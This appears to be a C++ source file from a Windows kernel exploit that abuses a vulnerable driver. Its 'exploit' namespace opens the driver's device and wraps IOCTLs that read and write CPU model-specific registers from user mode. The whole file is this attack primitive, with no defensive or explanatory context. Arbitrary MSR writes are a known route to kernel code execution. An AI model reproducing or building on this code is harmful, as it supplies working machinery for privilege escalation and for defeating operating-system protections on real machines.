#include "..\includes.h"

HANDLE exploit::h_device { };

bool exploit::open_handle( )
{
	h_device = CreateFileA( DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, NULL, nullptr,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );

	return h_device;
}

void exploit::close_handle( )
{
	if ( !h_device )
		return;

	CloseHandle( h_device );
}

bool exploit::write_msr( uint32_t address, uint64_t value )
{
	if ( !h_device )
		return false;

	WriteMsrStruct write_struct { address, value };

	DWORD ret_bytes { };
	return DeviceIoControl( h_device, IOCTL_WRITE_MSR, &write_struct, sizeof( write_struct ), nullptr, NULL, &ret_bytes, nullptr );
}

bool exploit::read_msr( uint32_t address, uint64_t* ptr_value )
{
	if ( !h_device )
		return false;

	DWORD ret_bytes { };
	return DeviceIoControl( h_device, IOCTL_READ_MSR, &address, sizeof( address ), ptr_value, sizeof( *ptr_value ), &ret_bytes, nullptr );
}